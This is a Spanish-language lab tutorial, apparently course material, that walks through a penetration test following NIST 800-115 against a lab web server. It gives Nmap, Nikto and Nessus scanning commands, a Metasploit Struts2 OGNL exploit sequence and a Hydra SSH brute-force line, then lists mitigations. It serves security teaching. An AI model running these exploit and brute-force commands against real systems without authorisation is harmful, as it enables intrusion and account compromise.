![M1](https://github.com/Grandote58/CloudSafeGuard/blob/main/Recursos/Recurso%201%402Menbrete1.png)

# **Práctica con Kali Linux Siguiendo NIST 800-115**

Vamos a realizar una prueba de seguridad **siguiendo la metodología de NIST 800-115** en un entorno de laboratorio.

## **🔹 Paso 1: Planificación**

- Objetivo: Evaluar la seguridad de un servidor web en la red interna.
- Reglas: Solo escaneo y explotación controlada, sin afectar la disponibilidad del sistema.

## **🔹 Paso 2: Descubrimiento**

Escanear la red con Nmap para identificar servicios expuestos:

```bash
nmap -sS -A -T4 192.168.1.10
```

Si encontramos un servidor web, verificamos vulnerabilidades con **Nikto**:

```bash
nikto -h http://192.168.1.10
```

Escanear vulnerabilidades con **Nessus**:

```bash
sudo systemctl start nessusd
firefox https://localhost:8834
```

## **🔹 Paso 3: Ataque**

Si Nikto detecta una vulnerabilidad en el servidor web, intentamos explotación con **Metasploit**:

```bash
msfconsole
use exploit/multi/http/struts2_content_type_ognl
set RHOSTS 192.168.1.10
set TARGETURI /login
exploit
```

Si hay un servicio SSH con credenciales débiles, intentamos fuerza bruta con **Hydra**:

```
hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.1.10 ssh
```

## **🔹 Paso 4: Reporte**

Documentamos los hallazgos, impacto y mitigaciones, incluyendo: 

✅ **Actualizar software vulnerable**.
✅ **Implementar políticas de contraseñas seguras**.
✅ **Restringir accesos mediante firewall**.





![M2](https://github.com/Grandote58/CloudSafeGuard/blob/main/Recursos/Recurso%203%402Menbrete2.png)